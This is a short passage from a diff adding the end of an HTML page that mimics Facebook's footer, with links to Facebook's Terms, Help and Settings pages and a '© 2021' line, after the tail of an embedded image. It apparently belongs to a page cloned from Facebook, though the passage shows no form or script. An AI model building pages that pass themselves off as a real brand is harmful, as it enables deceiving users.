QutDG8slIogo+NblTsPY/R8ExQoo0moYu/+DNqw7/Z6lvL3Zs4rUCM2jhG5WmnbBcO2HLa/t71fFuwf1Dg1b75VDQRtKe5IdjDniUoDlPBwj0if2V5xWypZHpKaYdxqQfezXlHeL35DsY0AMOFXmdyHgRD7RiWTFJxLRAMvsiiSK9Bkf0jkbJcJh3NS5XZFUTbFTZ87yHUejq0ZNXdwEu2jCtJQXqq7JoEnvt87UQz3W9MtVxn43a0Pw+/NVAbkJvZcPDl7zs+9TrvT72CNeTVzBRW3Hb7lFvqjaP141rLUx6zf8sPm02ze2nT+ttTJ2LNeHcyiab5b1cr0YXQZ/yv4P638QYJGwLA5/ZgAAAABJRU5ErkJggg==" width="13" height="13"></a>
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/terms/">&nbsp;&nbsp;&nbsp;Terms</a>
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/help/">&nbsp;&nbsp;&nbsp;Help</a>
+        <a style="color: rgb(107, 107, 107);" href="https://www.facebook.com/settings/">&nbsp;&nbsp;&nbsp;Settings</a>
+        </p><br>
+        <p id="shitty">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Facebook &copy; 2021</p>
+</body>
+</html>
